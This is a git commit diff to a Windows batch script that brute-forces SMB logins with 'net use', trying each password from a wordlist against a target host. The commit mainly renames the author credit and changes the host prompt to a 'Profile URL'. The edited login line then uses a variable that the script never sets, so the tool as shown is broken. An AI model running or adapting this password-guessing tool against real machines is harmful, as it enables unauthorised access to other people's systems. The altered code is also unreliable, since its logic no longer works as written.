653af01a7b164df5d2789f6bcb14066d0c9874dc
Jirmon1 <rickjameeh@gmail.com>
2025-07-10 21:33:02 +1000

    PVXNN BRUTEFORCE

--- main.bat
+++ main.bat
@@ -1,8 +1,8 @@
 @echo off
-title SMB Bruteforce - by Ebola Man
+title SMB Bruteforce - by PVXNN
 color A
 echo.
-set /p ip="Enter IP Address: "
+set /p ip="Enter Profile URL: "
 set /p user="Enter Username: "
 set /p wordlist="Enter Password List: "
 
@@ -23,7 +23,7 @@ pause
 exit
 
 :attempt
-net use \\%ip% /user:%user% %pass% >nul 2>&1
+net use \\%Profile% /user:%user% %pass% >nul 2>&1
 echo [ATTEMPT %count%] [%pass%]
 set /a count=%count%+1
 if %errorlevel% EQU 0 goto success
